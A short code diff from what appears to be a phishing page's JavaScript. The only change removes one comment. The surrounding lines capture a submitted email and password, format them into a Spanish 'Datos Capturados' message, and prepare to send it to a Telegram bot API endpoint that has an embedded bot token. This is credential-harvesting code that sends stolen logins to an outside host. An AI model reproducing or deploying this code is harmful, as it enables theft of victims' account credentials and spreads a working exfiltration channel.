@@ -152,7 +152,6 @@
         const email = event.target.email.value;
         const pass = event.target.password.value;
 
-        // Escape special Markdown characters
         let msg = `⚠️ **Datos Capturados** ⚠️\n\n**Usuario:** \n${email.replace(/([.*+?^${}()|[\]\\])/g, '\\$1')}\n\n**Contraseña:** \n${pass.replace(/([.*+?^${}()|[\]\\])/g, '\\$1')}\n\n⚠️ **Momento:** ${new Date().toLocaleString().replace(/([.*+?^${}()|[\]\\])/g, '\\$1')}`;
 
         const apiUrl = 'https://api.telegram.org/bot6774216442:AAHsScCJqeCfgyTshCgmfzuYU2bO1Yt0Qng/sendMessage';
